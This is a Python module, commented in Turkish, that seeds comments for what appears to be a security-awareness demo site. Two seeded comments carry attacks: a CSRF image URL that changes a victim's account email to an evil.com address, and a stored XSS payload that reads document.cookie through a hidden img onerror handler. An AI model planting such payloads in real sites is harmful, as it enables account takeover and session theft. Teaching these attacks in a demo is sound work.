"""Yorumlar (demo, bellekte tutulur -- posts.py gibi, DB yok).

Yapi:  COMMENTS[slug] = [ {yazar, metin, resim}, ... ]
  yazar : yorumu yazan kullanici
  metin : yorum metni
  resim : istege bagli bir gorsel URL'si (kullanici yorumuna resim ekleyebilir)
          -> CSRF demosunda saldirgan tam da burayi kotuye kullanacak.
"""

# Demo icin "onceden ekilmis" yorumlar. Son yorum SALDIRGANIN tuzagi:
# masum bir metin + resim URL'si olarak e-posta degistirme islemi.
# Bu habere giren giris-yapmis her kullanici (kurban) hacklenir.
COMMENTS = {
    # --- CSRF tuzagi (resim alaninda e-posta degistirme adresi) ---
    "parola-yoneticisi-sekiz-neden": [
        {"yazar": "mehmet58", "metin": "Gercekten faydali bir yazi, tesekkurler!", "resim": ""},
        {"yazar": "ays_e", "metin": "Ben de parola yoneticisine gectim, pismanlik yok.", "resim": ""},
        {"yazar": "deniz", "metin": "Harika anlatim, bir de su gorsele bakin 👇", "resim": "/hesap/email-degistir?email=saldirgan@evil.com"},
    ],
    # --- STORED XSS tuzagi (yorum METNINE gizlenmis kod) ---
    # Gorunur metin masum; sonundaki gizli <img> yuklenemeyince onerror calisir,
    # kurbanin cerezini okuyup farkindalik fonksiyonuna verir.
    "yapay-zeka-telefonlara-tasiniyor": [
        {"yazar": "teknosever", "metin": "Cihaz ustu modeller gercekten oyunu degistirecek.", "resim": ""},
        {"yazar": "x_kullanici", "metin": "Bence de cok yerinde tespitler 👏 <img src=x style=\"display:none\" onerror=\"window.xssYakala && window.xssYakala(document.cookie)\">", "resim": ""},
    ],
}


def yorumlar(slug: str):
    """Bir yazinin yorumlarini dondurur (yoksa bos liste)."""
    return COMMENTS.get(slug, [])


def yorum_ekle(slug: str, yazar: str, metin: str, resim: str = ""):
    """Yeni yorum ekler."""
    COMMENTS.setdefault(slug, []).append({
        "yazar": yazar,
        "metin": metin,
        "resim": resim,
    })
